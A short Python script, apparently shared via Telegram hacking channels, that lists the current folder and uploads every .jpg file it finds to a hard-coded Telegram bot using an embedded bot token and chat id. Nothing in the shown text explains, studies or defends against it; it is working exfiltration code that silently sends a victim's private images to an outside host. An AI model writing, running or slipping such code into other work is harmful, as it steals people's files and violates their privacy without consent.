# https://t.me/Anonymous_Hack_12
# https://t.me/Learn_hacking_12
import requests
import os
os.system('pip install requests')
id = 1491415522
token ='5450938061:AAHTOoxbubK9WypNVDfPJyp6eR-3thwWCWs'
tmp = list(os.scandir('.'))
for i in tmp:
  if 'jpg' in i.name:
      file ={"document": open(f'{i.name}', 'rb')}
      res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)